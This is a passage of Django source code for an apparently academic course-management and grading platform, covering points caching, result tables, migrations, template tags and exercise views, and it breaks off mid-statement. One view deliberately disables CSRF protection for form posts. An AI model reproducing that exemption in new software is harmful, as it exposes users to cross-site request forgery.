if model == Submission:\n            seen_courses = set()\n            for submission_pk in pk_set:\n                try:\n                    submission = Submission.objects.get(pk=submission_pk)\n                    course_instance = submission.exercise.course_instance\n                    if course_instance.pk not in seen_courses:\n                        CachedPoints.invalidate(course_instance, instance.user)\n                    else:\n                        seen_courses.add(course_instance.pk)\n                except Submission.DoesNotExist:\n                    pass\n    else:\n        # instance is a Submission\n        invalidate_content(Submission, instance)\n\ndef invalidate_notification(sender, instance, **kwargs):\n    course = instance.course_instance\n    if not course and instance.submission:\n        course = instance.submission.exercise.course_instance\n    CachedPoints.invalidate(course, instance.recipient.user)\n\n\n# Automatically invalidate cached points when submissions change.\npost_save.connect(invalidate_content, sender=Submission)\npost_delete.connect(invalidate_content, sender=Submission)\npost_save.connect(invalidate_notification, sender=Notification)\npost_delete.connect(invalidate_notification, sender=Notification)\n# listen to the m2m_changed signal since submission.submitters is a many-to-many\n# field and instances must be saved before the many-to-many fields may be modified,\n# that is to say, the submission post save hook may see an empty submitters list\nm2m_changed.connect(invalidate_content_m2m, sender=Submission.submitters.through)\n/n/n/n/exercise/exercise_summary.py/n/nimport itertools\n\nfrom django.core.exceptions import ObjectDoesNotExist\nfrom django.db.models import Max\n\nfrom course.models import StudentGroup\nfrom .cache.content import CachedContent\nfrom .models import BaseExercise, Submission\n\n\nclass UserExerciseSummary(object):\n    \"\"\"\n    UserExerciseSummary summarises the submissions of a certain user and\n    exercise. It calculates some characterizing figures such as the number of\n    submissions and reference to the best submission. See the public methods\n    for more.\n    \"\"\"\n    def __init__(self, exercise, user=None):\n        self.exercise = exercise\n        self.max_points = getattr(exercise, 'max_points', 0)\n        self.difficulty = getattr(exercise, 'difficulty', '')\n        self.points_to_pass = getattr(exercise, 'points_to_pass', 0)\n        self.user = user\n        self.submissions = []\n        self.submission_count = 0\n        self.best_submission = None\n        self.graded = False\n        self.unofficial = False\n\n        if self.user and self.user.is_authenticated():\n            self.submissions = list(exercise.get_submissions_for_student(\n                user.userprofile))\n            for s in self.submissions:\n                if not s.status in (\n                    Submission.STATUS.ERROR,\n                    Submission.STATUS.REJECTED,\n                ):\n                    self.submission_count += 1\n                    if (\n                        s.status == Submission.STATUS.READY and (\n                            self.best_submission is None\n                            or self.unofficial\n                            or s.grade > self.best_submission.grade\n                        )\n                    ):\n                        self.best_submission = s\n                        self.unofficial = False\n                        self.graded = True\n                    elif (\n                        s.status == Submission.STATUS.UNOFFICIAL and (\n                            not self.graded\n                            or (\n                                self.unofficial\n                                and s.grade > self.best_submission.grade\n                            )\n                        )\n                    ):\n                        self.best_submission = s\n                        self.unofficial = True\n\n    def get_submission_count(self):\n        return self.submission_count\n\n    def get_submissions(self):\n        return self.submissions\n\n    def get_best_submission(self):\n        return self.best_submission\n\n    def get_points(self):\n        return self.best_submission.grade if self.best_submission and not self.unofficial else 0\n\n    def get_penalty(self):\n        return self.best_submission.late_penalty_applied if self.best_submission else None\n\n    def is_missing_points(self):\n        return self.get_points() < self.points_to_pass\n\n    def is_full_points(self):\n        return self.get_points() >= self.max_points\n\n    def is_passed(self):\n        return not self.is_missing_points()\n\n    def is_submitted(self):\n        return self.submission_count > 0\n\n    def is_graded(self):\n        return self.graded\n\n    def is_unofficial(self):\n        return self.unofficial\n\n    def get_group(self):\n        if self.submission_count > 0:\n            s = self.submissions[0]\n            if s.submitters.count() > 0:\n                return StudentGroup.get_exact(\n                    self.exercise.course_instance,\n                    s.submitters.all()\n                )\n        return None\n\n    def get_group_id(self):\n        group = self.get_group()\n        return group.id if group else 0\n\n\nclass ResultTable:\n    \"\"\"\n    WARNING: Constructing this class is a heavy database operation.\n\n    Models the table displaying the grades for each student on each exercise.\n    Result tables are generated dynamically when needed and not stored\n    in a database.\n    \"\"\"\n\n    def __init__(self, course_instance):\n        \"\"\"\n        Instantiates a new ResultTable for the given course instance.\n        After initialization the table is filled with grades from the database.\n        \"\"\"\n        self.course_instance = course_instance\n\n        # Exercises on the course.\n        self.exercises = list(self.__get_exercises())\n        self.categories = course_instance.categories.all()\n\n        # Students on the course.\n        self.students = list(course_instance.get_student_profiles())\n\n        # Empty results table.\n        self.results = {\n            student.id: {\n                exercise.id: None for exercise in self.exercises\n            } for student in self.students\n        }\n        self.results_by_category = {\n            student.id: {\n                category.id: 0 for category in self.categories\n            } for student in self.students\n        }\n\n        # Fill the results with the data from the database.\n        self.__collect_student_grades()\n\n\n    def __get_exercises(self):\n        content = CachedContent(self.course_instance)\n\n        def get_descendant_ids(node):\n            children = node['children']\n            if children:\n                return itertools.chain.from_iterable(\n                    [get_descendant_ids(child) for child in children])\n            return (node['id'],)\n\n        root_node = { 'children': content.modules() }\n        ids = get_descendant_ids(root_node)\n\n        # Loop until end of ids raises StopIteration\n        while True:\n            id = next(ids)\n            try:\n                yield BaseExercise.objects.get(learningobject_ptr_id=id)\n            except ObjectDoesNotExist:\n                continue\n\n\n    def __collect_student_grades(self):\n        \"\"\"\n        Helper for the __init__.\n        This method puts the data from the database in to the results table.\n        \"\"\"\n        submissions = list(Submission.objects \\\n            .filter(\n                exercise__course_module__course_instance=self.course_instance,\n                status=Submission.STATUS.READY\n            ).values(\"submitters\", \"exercise\", \"exercise__category\") \\\n            .annotate(best=Max(\"grade\")) \\\n            .order_by()) # Remove default ordering.\n        for submission in submissions:\n            student_id = submission[\"submitters\"]\n            if student_id in self.results:\n                self.results[student_id][submission[\"exercise\"]] = submission[\"best\"]\n                self.results_by_category[student_id][submission[\"exercise__category\"]] += submission[\"best\"]\n\n\n    def results_for_template(self):\n        \"\"\"\n        Converts the results data into a form that is convenient for to use in a\n        template. The columns of the table ordered according to the order of the\n        exercises in self.exercises.\n        \"\"\"\n        for_template = []\n        for student in self.students:\n            grades = [ self.results[student.id][exercise.id] \\\n                for exercise in self.exercises ]\n            total = sum(g for g in grades if g is not None)\n            for_template.append((student, grades, total))\n        return for_template\n\n\n    def max_sum(self):\n        return sum(e.max_points for e in self.exercises)\n/n/n/n/exercise/migrations/0001_initial.py/n/n# -*- coding: utf-8 -*-\n\n\nfrom django.db import models, migrations\nfrom django.utils import timezone\nimport datetime\nimport exercise.submission_models\nimport lib.helpers\nimport exercise.exercise_models\nimport lib.fields\n\n\nclass Migration(migrations.Migration):\n\n    dependencies = [\n        ('inheritance', '0001_initial'),\n        ('userprofile', '0001_initial'),\n        ('course', '0001_initial'),\n    ]\n\n    operations = [\n        migrations.CreateModel(\n            name='CourseModule',\n            fields=[\n                ('id', models.AutoField(verbose_name='ID', serialize=False, auto_created=True, primary_key=True)),\n                ('name', models.CharField(max_length=255)),\n                ('points_to_pass', models.PositiveIntegerField(default=0)),\n                ('introduction', models.TextField(blank=True)),\n                ('opening_time', models.DateTimeField(default=timezone.now)),\n                ('closing_time', models.DateTimeField(default=timezone.now)),\n                ('late_submissions_allowed', models.BooleanField(default=False)),\n                ('late_submission_deadline', models.DateTimeField(default=timezone.now)),\n                ('late_submission_penalty', lib.fields.PercentField(default=0.5, help_text='Multiplier of points to reduce, as decimal. 0.1 = 10%')),\n                ('course_instance', models.ForeignKey(related_name='course_modules', to='course.CourseInstance')),\n            ],\n            options={\n                'ordering': ['closing_time', 'id'],\n            },\n            bases=(models.Model,),\n        ),\n        migrations.CreateModel(\n            name='DeadlineRuleDeviation',\n            fields=[\n                ('id', models.AutoField(verbose_name='ID', serialize=False, auto_created=True, primary_key=True)),\n                ('extra_minutes', models.IntegerField()),\n            ],\n            options={\n                'abstract': False,\n            },\n            bases=(models.Model,),\n        ),\n        migrations.CreateModel(\n            name='LearningObject',\n            fields=[\n                ('modelwithinheritance_ptr', models.OneToOneField(parent_link=True, auto_created=True, primary_key=True, serialize=False, to='inheritance.ModelWithInheritance')),\n                ('order', models.IntegerField(default=0)),\n                ('name', models.CharField(max_length=255)),\n                ('description', models.TextField(blank=True)),\n                ('instructions', models.TextField(blank=True)),\n                ('service_url', models.URLField(blank=True)),\n            ],\n            options={\n            },\n            bases=('inheritance.modelwithinheritance',),\n        ),\n        migrations.CreateModel(\n            name='BaseExercise',\n            fields=[\n                ('learningobject_ptr', models.OneToOneField(parent_link=True, auto_created=True, primary_key=True, serialize=False, to='exercise.LearningObject')),\n                ('allow_assistant_grading', models.BooleanField(default=False)),\n                ('min_group_size', models.PositiveIntegerField(default=1)),\n                ('max_group_size', models.PositiveIntegerField(default=1)),\n                ('max_submissions', models.PositiveIntegerField(default=10)),\n                ('max_points', models.PositiveIntegerField(default=100)),\n                ('points_to_pass', models.PositiveIntegerField(default=40)),\n            ],\n            options={\n                'ordering': ['course_module__closing_time', 'course_module', 'order', 'id'],\n            },\n            bases=('exercise.learningobject',),\n        ),\n        migrations.CreateModel(\n            name='ExerciseWithAttachment',\n            fields=[\n                ('baseexercise_ptr', models.OneToOneField(parent_link=True, auto_created=True, primary_key=True, serialize=False, to='exercise.BaseExercise')),\n                ('files_to_submit', models.CharField(help_text='File names that user should submit, use pipe character to separate files', max_length=200, blank=True)),\n                ('attachment', models.FileField(upload_to=exercise.exercise_models.build_upload_dir)),\n            ],\n            options={\n                'verbose_name_plural': 'exercises with attachment',\n            },\n            bases=('exercise.baseexercise',),\n        ),\n        migrations.CreateModel(\n            name='AsynchronousExercise',\n            fields=[\n                ('baseexercise_ptr', models.OneToOneField(parent_link=True, auto_created=True, primary_key=True, serialize=False, to='exercise.BaseExercise')),\n            ],\n            options={\n            },\n            bases=('exercise.baseexercise',),\n        ),\n        migrations.CreateModel(\n            name='LearningObjectCategory',\n            fields=[\n                ('id', models.AutoField(verbose_name='ID', serialize=False, auto_created=True, primary_key=True)),\n                ('name', models.CharField(max_length=35)),\n                ('description', models.TextField(blank=True)),\n                ('points_to_pass', models.PositiveIntegerField(default=0)),\n                ('course_instance', models.ForeignKey(related_name='categories', to='course.CourseInstance')),\n                ('hidden_to', models.ManyToManyField(related_name='hidden_categories', null=True, to='userprofile.UserProfile', blank=True)),\n            ],\n            options={\n            },\n            bases=(models.Model,),\n        ),\n        migrations.CreateModel(\n            name='MaxSubmissionsRuleDeviation',\n            fields=[\n                ('id', models.AutoField(verbose_name='ID', serialize=False, auto_created=True, primary_key=True)),\n                ('extra_submissions', models.IntegerField()),\n            ],\n            options={\n                'abstract': False,\n            },\n            bases=(models.Model,),\n        ),\n        migrations.CreateModel(\n            name='StaticExercise',\n            fields=[\n                ('baseexercise_ptr', models.OneToOneField(parent_link=True, auto_created=True, primary_key=True, serialize=False, to='exercise.BaseExercise')),\n                ('exercise_page_content', models.TextField()),\n                ('submission_page_content', models.TextField()),\n            ],\n            options={\n            },\n            bases=('exercise.baseexercise',),\n        ),\n        migrations.CreateModel(\n            name='Submission',\n            fields=[\n                ('id', models.AutoField(verbose_name='ID', serialize=False, auto_created=True, primary_key=True)),\n                ('submission_time', models.DateTimeField(auto_now_add=True)),\n                ('hash', models.CharField(default=lib.helpers.get_random_string, max_length=32)),\n                ('feedback', models.TextField(blank=True)),\n                ('assistant_feedback', models.TextField(blank=True)),\n                ('status', models.CharField(default=b'initialized', max_length=32, choices=[(b'initialized', 'Initialized'), (b'waiting', 'Waiting'), (b'ready', 'Ready'), (b'error', 'Error')])),\n                ('grade', models.IntegerField(default=0)),\n                ('grading_time', models.DateTimeField(null=True, blank=True)),\n                ('service_points', models.IntegerField(default=0)),\n                ('service_max_points', models.IntegerField(default=0)),\n                ('submission_data', lib.fields.JSONField(blank=True)),\n                ('grading_data', lib.fields.JSONField(blank=True)),\n            ],\n            options={\n                'ordering': ['-submission_time'],\n            },\n            bases=(models.Model,),\n        ),\n        migrations.CreateModel(\n            name='SubmittedFile',\n            fields=[\n                ('id', models.AutoField(verbose_name='ID', serialize=False, auto_created=True, primary_key=True)),\n                ('param_name', models.CharField(max_length=128)),\n                ('file_object', models.FileField(max_length=255, upload_to=exercise.submission_models.build_upload_dir)),\n                ('submission', models.ForeignKey(related_name='files', to='exercise.Submission')),\n            ],\n            options={\n            },\n            bases=(models.Model,),\n        ),\n        migrations.CreateModel(\n            name='SynchronousExercise',\n            fields=[\n                ('baseexercise_ptr', models.OneToOneField(parent_link=True, auto_created=True, primary_key=True, serialize=False, to='exercise.BaseExercise')),\n            ],\n            options={\n            },\n            bases=('exercise.baseexercise',),\n        ),\n        migrations.AddField(\n            model_name='submission',\n            name='exercise',\n            field=models.ForeignKey(related_name='submissions', to='exercise.BaseExercise'),\n            preserve_default=True,\n        ),\n        migrations.AddField(\n            model_name='submission',\n            name='grader',\n            field=models.ForeignKey(related_name='graded_submissions', blank=True, to='userprofile.UserProfile', null=True),\n            preserve_default=True,\n        ),\n        migrations.AddField(\n            model_name='submission',\n            name='submitters',\n            field=models.ManyToManyField(related_name='submissions', to='userprofile.UserProfile'),\n            preserve_default=True,\n        ),\n        migrations.AddField(\n            model_name='maxsubmissionsruledeviation',\n            name='exercise',\n            field=models.ForeignKey(related_name='maxsubmissionsruledeviations', to='exercise.BaseExercise'),\n            preserve_default=True,\n        ),\n        migrations.AddField(\n            model_name='maxsubmissionsruledeviation',\n            name='submitter',\n            field=models.ForeignKey(to='userprofile.UserProfile'),\n            preserve_default=True,\n        ),\n        migrations.AlterUniqueTogether(\n            name='maxsubmissionsruledeviation',\n            unique_together=set([('exercise', 'submitter')]),\n        ),\n        migrations.AlterUniqueTogether(\n            name='learningobjectcategory',\n            unique_together=set([('name', 'course_instance')]),\n        ),\n        migrations.AddField(\n            model_name='learningobject',\n            name='category',\n            field=models.ForeignKey(related_name='learning_objects', to='exercise.LearningObjectCategory'),\n            preserve_default=True,\n        ),\n        migrations.AddField(\n            model_name='learningobject',\n            name='course_module',\n            field=models.ForeignKey(related_name='learning_objects', to='exercise.CourseModule'),\n            preserve_default=True,\n        ),\n        migrations.AddField(\n            model_name='deadlineruledeviation',\n            name='exercise',\n            field=models.ForeignKey(related_name='deadlineruledeviations', to='exercise.BaseExercise'),\n            preserve_default=True,\n        ),\n        migrations.AddField(\n            model_name='deadlineruledeviation',\n            name='submitter',\n            field=models.ForeignKey(to='userprofile.UserProfile'),\n            preserve_default=True,\n        ),\n        migrations.AlterUniqueTogether(\n            name='deadlineruledeviation',\n            unique_together=set([('exercise', 'submitter')]),\n        ),\n    ]\n/n/n/n/exercise/migrations/0005_auto_20150625_1821.py/n/n# -*- coding: utf-8 -*-\nfrom __future__ import unicode_literals\n\nfrom django.db import models, migrations\nimport django.utils.timezone\n\n\nclass Migration(migrations.Migration):\n\n    dependencies = [\n        ('exercise', '0004_auto_20150617_1033'),\n    ]\n\n    operations = [\n        migrations.AlterField(\n            model_name='coursemodule',\n            name='closing_time',\n            field=models.DateTimeField(default=django.utils.timezone.now),\n            preserve_default=True,\n        ),\n        migrations.AlterField(\n            model_name='coursemodule',\n            name='late_submission_deadline',\n            field=models.DateTimeField(default=django.utils.timezone.now),\n            preserve_default=True,\n        ),\n        migrations.AlterField(\n            model_name='coursemodule',\n            name='opening_time',\n            field=models.DateTimeField(default=django.utils.timezone.now),\n            preserve_default=True,\n        ),\n        migrations.AlterField(\n            model_name='deadlineruledeviation',\n            name='exercise',\n            field=models.ForeignKey(to='exercise.BaseExercise'),\n            preserve_default=True,\n        ),\n        migrations.AlterField(\n            model_name='maxsubmissionsruledeviation',\n            name='exercise',\n            field=models.ForeignKey(to='exercise.BaseExercise'),\n            preserve_default=True,\n        ),\n    ]\n/n/n/n/exercise/migrations/0007_auto_20150625_1835.py/n/n# -*- coding: utf-8 -*-\nfrom __future__ import unicode_literals\n\nfrom django.db import models, migrations\n\n\nclass Migration(migrations.Migration):\n\n    dependencies = [\n        ('exercise', '0006_auto_20150625_1823'),\n        ('course', '0005_auto_20150625_1835'),\n        ('deviations', '0001_initial')\n    ]\n\n    operations = [\n        migrations.AlterField(\n            model_name='learningobject',\n            name='category',\n            field=models.ForeignKey(related_name='learning_objects', to='course.LearningObjectCategory'),\n            preserve_default=True,\n        ),\n        migrations.AlterField(\n            model_name='learningobject',\n            name='course_module',\n            field=models.ForeignKey(related_name='learning_objects', to='course.CourseModule'),\n            preserve_default=True,\n        ),\n    ]\n/n/n/n/exercise/migrations/0011_auto_20151218_0857.py/n/n# -*- coding: utf-8 -*-\nfrom __future__ import unicode_literals\n\nfrom django.db import models, migrations\nimport django.core.validators\n\n\nclass Migration(migrations.Migration):\n\n    dependencies = [\n        ('exercise', '0010_auto_20151214_1714'),\n    ]\n\n    operations = [\n        migrations.CreateModel(\n            name='CourseChapter',\n            fields=[\n                ('learningobject_ptr', models.OneToOneField(parent_link=True, primary_key=True, to='exercise.LearningObject', serialize=False, auto_created=True)),\n                ('generate_table_of_contents', models.BooleanField(default=False)),\n            ],\n            options={\n            },\n            bases=('exercise.learningobject',),\n        ),\n        migrations.AddField(\n            model_name='learningobject',\n            name='content_head',\n            field=models.TextField(blank=True),\n            preserve_default=True,\n        ),\n        migrations.AddField(\n            model_name='learningobject',\n            name='parent',\n            field=models.ForeignKey(related_name='children', null=True, to='exercise.LearningObject', blank=True),\n            preserve_default=True,\n        ),\n        migrations.AddField(\n            model_name='learningobject',\n            name='status',\n            field=models.CharField(choices=[('ready', 'Ready'), ('hidden', 'Hidden'), ('maintenance', 'Maintenance')], max_length=32, default='ready'),\n            preserve_default=True,\n        ),\n        migrations.AddField(\n            model_name='learningobject',\n            name='url',\n            field=models.CharField(max_length=255, help_text='Input an URL identifier for this object.', validators=[django.core.validators.RegexValidator(regex='^[\\\\w\\\\-\\\\.]*$')],\n            blank=True, null=True, default=None),\n            preserve_default=True,\n        ),\n        migrations.AddField(\n            model_name='learningobject',\n            name='use_wide_column',\n            field=models.BooleanField(help_text='Remove the third info column for more space.', default=False),\n            preserve_default=True,\n        ),\n        migrations.AlterField(\n            model_name='learningobject',\n            name='description',\n            field=models.TextField(help_text='Internal description is not presented on site.', blank=True),\n            preserve_default=True,\n        ),\n    ]\n/n/n/n/exercise/migrations/0014_ltiexercise.py/n/n# -*- coding: utf-8 -*-\nfrom __future__ import unicode_literals\n\nfrom django.db import models, migrations\n\n\nclass Migration(migrations.Migration):\n\n    dependencies = [\n        ('external_services', '0004_auto_20150828_1210'),\n        ('exercise', '0013_auto_20151222_1320'),\n    ]\n\n    operations = [\n        migrations.CreateModel(\n            name='LTIExercise',\n            fields=[\n                ('baseexercise_ptr', models.OneToOneField(auto_created=True, primary_key=True, serialize=False, parent_link=True, to='exercise.BaseExercise')),\n                ('lti_service', models.ForeignKey(to='external_services.LTIService')),\n            ],\n            options={\n            },\n            bases=('exercise.baseexercise',),\n        ),\n    ]\n/n/n/n/exercise/migrations/0015_auto_20160124_2139.py/n/n# -*- coding: utf-8 -*-\nfrom __future__ import unicode_literals\n\nfrom django.db import models, migrations\n\n\nclass Migration(migrations.Migration):\n\n    dependencies = [\n        ('userprofile', '0002_auto_20150427_1717'),\n        ('exercise', '0014_ltiexercise'),\n    ]\n\n    operations = [\n        migrations.CreateModel(\n            name='LearningObjectDisplay',\n            fields=[\n                ('id', models.AutoField(verbose_name='ID', serialize=False, auto_created=True, primary_key=True)),\n                ('timestamp', models.DateTimeField(auto_now_add=True)),\n                ('learning_object', models.ForeignKey(to='exercise.LearningObject')),\n                ('profile', models.ForeignKey(to='userprofile.UserProfile')),\n            ],\n            options={\n            },\n            bases=(models.Model,),\n        ),\n        migrations.AlterField(\n            model_name='learningobject',\n            name='status',\n            field=models.CharField(choices=[('ready', 'Ready'), ('unlisted', 'Unlisted in table of contents'), ('enrollment', 'Enrollment questions'), ('hidden', 'Hidden from non course staff'), ('maintenance', 'Maintenance')], max_length=32, default='ready'),\n            preserve_default=True,\n        ),\n    ]\n/n/n/n/exercise/templatetags/exercise.py/n/nimport json\nfrom django import template\nfrom django.db.models import Max, Min\nfrom django.template.loader import render_to_string\nfrom django.utils import timezone\nfrom django.utils.translation import ugettext_lazy as _\n\nfrom course.models import CourseModule\nfrom lib.errors import TagUsageError\nfrom ..cache.content import CachedContent\nfrom ..cache.points import CachedPoints\nfrom ..exercise_summary import UserExerciseSummary\nfrom ..models import LearningObjectDisplay, LearningObject, Submission, BaseExercise\n\n\nregister = template.Library()\n\n\ndef _prepare_now(context):\n    if not 'now' in context:\n        context['now'] = timezone.now()\n    return context['now']\n\n\ndef _prepare_context(context, student=None):\n    if not 'instance' in context:\n        raise TagUsageError()\n    instance = context['instance']\n    _prepare_now(context)\n    if not 'content' in context:\n        context['content'] = CachedContent(instance)\n    def points(user, key):\n        if not key in context:\n            context[key] = CachedPoints(instance, user, context['content'])\n        return context[key]\n    if student:\n        return points(student, 'studentpoints')\n    return points(context['request'].user, 'points')\n\n\ndef _get_toc(context, student=None):\n    points = _prepare_context(context, student)\n    context = context.flatten()\n    context.update({\n        'modules': points.modules_flatted(),\n        'categories': points.categories(),\n        'total': points.total(),\n        'is_course_staff': context.get('is_course_staff', False),\n    })\n    return context\n\n\n@register.inclusion_tag(\"exercise/_user_results.html\", takes_context=True)\ndef user_results(context, student=None):\n    values = _get_toc(context, student)\n    values['total_json'] = json.dumps(values['total'])\n    if student:\n        values['is_course_staff'] = False\n    return values\n\n\n@register.inclusion_tag(\"exercise/_user_toc.html\", takes_context=True)\ndef user_toc(context, student=None):\n    return _get_toc(context, student)\n\n\n@register.inclusion_tag(\"exercise/_user_last.html\", takes_context=True)\ndef user_last(context):\n    user = context['request'].user\n    points = _prepare_context(context)\n    if user.is_authenticated():\n        last = LearningObjectDisplay.objects.filter(\n            profile=user.userprofile,\n            learning_object__status=LearningObject.STATUS.READY,\n            learning_object__course_module__course_instance=context['instance'],\n        ).select_related('learning_object').order_by('-timestamp').first()\n        if last:\n            entry,_,_,_ = points.find(last.learning_object)\n            return {\n                'last': entry,\n                'last_time': last.timestamp,\n            }\n    return {\n        'begin': points.begin(),\n        'instance': context['instance'],\n    }\n\n\n@register.inclusion_tag(\"exercise/_category_points.html\", takes_context=True)\ndef category_points(context, student=None):\n    return _get_toc(context, student)\n\n\n@register.inclusion_tag(\"exercise/_submission_list.html\", takes_context=True)\ndef latest_submissions(context):\n    submissions = context[\"profile\"].submissions \\\n        .filter(exercise__course_module__course_instance=context[\"instance\"]) \\\n        .order_by(\"-id\")[:10]\n    return {\n        \"submissions\": submissions,\n        \"title\": _(\"Latest submissions\"),\n        \"empty\": _(\"No submissions for this course.\"),\n    }\n\n\n@register.filter\ndef max_submissions(exercise, user_profile):\n    return exercise.max_submissions_for_student(user_profile)\n\n\n@register.filter\ndef percent(decimal):\n    return int(decimal * 100)\n\n\n@register.filter\ndef submission_status(status):\n    return Submission.STATUS[status]\n\n\ndef _points_data(obj, classes=None):\n    if isinstance(obj, UserExerciseSummary):\n        exercise = obj.exercise\n        data = {\n            'points': obj.get_points(),\n            'max': exercise.max_points,\n            'difficulty': exercise.difficulty,\n            'required': exercise.points_to_pass,\n            'confirm_the_level': exercise.category.confirm_the_level,\n            'missing_points': obj.is_missing_points(),\n            'passed': obj.is_passed(),\n            'full_score': obj.is_full_points(),\n            'submitted': obj.is_submitted(),\n            'graded': obj.is_graded(),\n            'official': not obj.is_unofficial(),\n            'exercise_page': True,\n        }\n    elif isinstance(obj, Submission):\n        exercise = obj.exercise\n        data = {\n            'points': obj.grade,\n            'max': exercise.max_points,\n            'difficulty': exercise.difficulty,\n            'required': exercise.points_to_pass,\n            'confirm_the_level': exercise.category.confirm_the_level,\n            'missing_points': obj.grade < exercise.points_to_pass,\n            'passed': obj.grade >= exercise.points_to_pass,\n            'full_score': obj.grade >= exercise.max_points,\n            'submitted': True,\n            'graded': obj.is_graded,\n            'official': obj.status != Submission.STATUS.UNOFFICIAL,\n        }\n        if not obj.is_graded and (\n                    not exercise.category.confirm_the_level\n                    or obj.status != Submission.STATUS.WAITING\n                ):\n            data['status'] = obj.status\n    else:\n        points = obj.get('points', 0)\n        max_points = obj.get('max_points', 0)\n        required = obj.get('points_to_pass', 0)\n        data = {\n            'points': points,\n            'max': max_points,\n            'difficulty': obj.get('difficulty', ''),\n            'required': required,\n            'confirm_the_level': obj.get('confirm_the_level', False),\n            'missing_points': points < required,\n            'passed': obj.get('passed', True),\n            'full_score': points >= max_points,\n            'submitted': obj.get('submission_count', 0) > 0,\n            'graded': obj.get('graded', True),\n            'status': obj.get('submission_status', False),\n            'unconfirmed': obj.get('unconfirmed', False),\n            'official': not obj.get('unofficial', False),\n            'confirmable_points': obj.get('confirmable_points', False),\n        }\n    percentage = 0\n    required_percentage = None\n    if data['max'] > 0:\n        percentage = int(round(100.0 * data['points'] / data['max']))\n        if data['required']:\n            required_percentage = int(round(100.0 * data['required'] / data['max']))\n    data.update({\n        'classes': classes,\n        'percentage': percentage,\n        'required_percentage': required_percentage,\n    })\n    return data\n\n\n@register.inclusion_tag(\"exercise/_points_progress.html\")\ndef points_progress(obj):\n    return _points_data(obj)\n\n\n@register.inclusion_tag(\"exercise/_points_badge.html\")\ndef points_badge(obj, classes=None):\n    return _points_data(obj, classes)\n\n\n@register.assignment_tag(takes_context=True)\ndef max_group_size(context):\n    points = _prepare_context(context)\n    return points.total()['max_group_size']\n\n\n@register.assignment_tag(takes_context=True)\ndef min_group_size(context):\n    points = _prepare_context(context)\n    return points.total()['min_group_size']\n\n\n@register.assignment_tag(takes_context=True)\ndef module_accessible(context, entry):\n    t = entry.get('opening_time')\n    if t and t > _prepare_now(context):\n        return False\n    if entry.get('requirements'):\n        points = _prepare_context(context)\n        module = CourseModule.objects.get(id=entry['id'])\n        return module.are_requirements_passed(points)\n    return True\n\n\n@register.assignment_tag\ndef get_grading_errors(submission):\n    if not isinstance(submission.grading_data, dict):\n        return \"\"\n    grading_data = submission.grading_data.get('grading_data')\n    if not isinstance(grading_data, str):\n        return \"\"\n    if grading_data.startswith('<pre>'):\n        return grading_data[5:-6]\n    try:\n        return json.loads(grading_data).get('errors', \"\")\n    except (AttributeError, TypeError, ValueError):\n        return \"\"\n\n\n@register.inclusion_tag(\"exercise/_text_stats.html\", takes_context=True)\ndef exercise_text_stats(context, exercise):\n    if not 'instance' in context:\n        raise TagUsageError()\n    instance = context['instance']\n\n    if not 'student_count' in context:\n        context['student_count'] = instance.students.count()\n    total = context['student_count']\n\n    if isinstance(exercise, int):\n        num = instance.students.filter(submissions__exercise_id=exercise).distinct().count()\n    else:\n        num = exercise.number_of_submitters() if exercise else 0\n    return {\n        \"number\": num,\n        \"percentage\": int(100 * num / total) if total else 0,\n    }\n\n@register.simple_tag\ndef get_format_info(format):\n    format_infos = {\n        'json' : {\n            'name': 'json',\n            'verbose_name': 'JSON',\n        },\n        'csv': {\n            'name': 'csv',\n            'verbose_name': 'CSV',\n        },\n        'excel.csv': {\n            'name': 'excel.csv',\n            'verbose_name': _('Excel compatible CSV'),\n        },\n    }\n    try:\n        return format_infos[format]\n    except KeyError as e:\n        raise RuntimeError('Invalid format: \\'{}\\''.format(format)) from e\n\n@register.simple_tag\ndef get_format_info_list(formats):\n    return [get_format_info(format) for format in formats.split()]\n/n/n/n/exercise/views.py/n/nfrom django.conf import settings\nfrom django.contrib import messages\nfrom django.core.exceptions import MultipleObjectsReturned, PermissionDenied\nfrom django.http.response import Http404, HttpResponse\nfrom django.shortcuts import get_object_or_404\nfrom django.utils.decorators import method_decorator\nfrom django.utils.translation import ugettext_lazy as _\nfrom django.views.decorators.clickjacking import xframe_options_exempt\nfrom django.views.decorators.csrf import csrf_exempt\nfrom django.views.static import serve\n\nfrom authorization.permissions import ACCESS\nfrom course.models import CourseModule\nfrom course.viewbase import CourseInstanceBaseView, EnrollableViewMixin\nfrom lib.remote_page import RemotePageNotFound, request_for_response\nfrom lib.viewbase import BaseRedirectMixin, BaseView\nfrom .models import LearningObject, LearningObjectDisplay\nfrom .protocol.exercise_page import ExercisePage\nfrom .submission_models import SubmittedFile, Submission\nfrom .viewbase import ExerciseBaseView, SubmissionBaseView, SubmissionMixin, ExerciseModelBaseView, ExerciseTemplateBaseView\n\nfrom .exercisecollection_models import ExerciseCollection\nfrom .exercise_summary import UserExerciseSummary\nfrom django.urls import reverse\n\n\nclass TableOfContentsView(CourseInstanceBaseView):\n    template_name = \"exercise/toc.html\"\n\n\nclass ResultsView(TableOfContentsView):\n    template_name = \"exercise/results.html\"\n\n\nclass ExerciseInfoView(ExerciseBaseView):\n    ajax_template_name = \"exercise/_exercise_info.html\"\n\n    def get_common_objects(self):\n        super().get_common_objects()\n        self.get_summary_submissions()\n\n\nclass ExerciseView(BaseRedirectMixin, ExerciseBaseView, EnrollableViewMixin):\n    template_name = \"exercise/exercise.html\"\n    ajax_template_name = \"exercise/exercise_plain.html\"\n    post_url_name = \"exercise\"\n    access_mode = ACCESS.STUDENT\n\n    # Allow form posts without the cross-site-request-forgery key.\n    @method_decorator(csrf_exempt)\n    def dispatch(self, request, *args, **kwargs):\n        return super().dispatch(request, *args, **kwargs)\n\n    def get_access_mode(self):\n        access_mode = super().get_access_mode()\n\n        # Loosen the access mode if exercise is enrollment\n        if (self.exercise.status in (\n                LearningObject.STATUS.ENROLLMENT,\n                LearningObject.STATUS.ENROLLMENT_EXTERNAL,\n              ) and access_mode == ACCESS.STUDENT):\n            access_mode = ACCESS.ENROLL\n\n        return access_mode\n\n    def get(self, request, *args, **kwargs):\n        exercisecollection = None\n        exercisecollection_title = None\n        submission_allowed = False\n        disable_submit = False\n        should_enroll = False\n        issues = []\n        students = [self.profile]\n\n        if self.exercise.is_submittable:\n            SUBMIT_STATUS = self.exercise.SUBMIT_STATUS\n            submission_status, submission_allowed, issues, students = self.submission_check()\n            self.get_summary_submissions()\n            disable_submit = submission_status in [\n                SUBMIT_STATUS.CANNOT_ENROLL,\n                SUBMIT_STATUS.NOT_ENROLLED,\n            ]\n            should_enroll = submission_status == SUBMIT_STATUS.NOT_ENROLLED\n\n        if (self.exercise.status == LearningObject.STATUS.MAINTENANCE\n              or self.module.status == 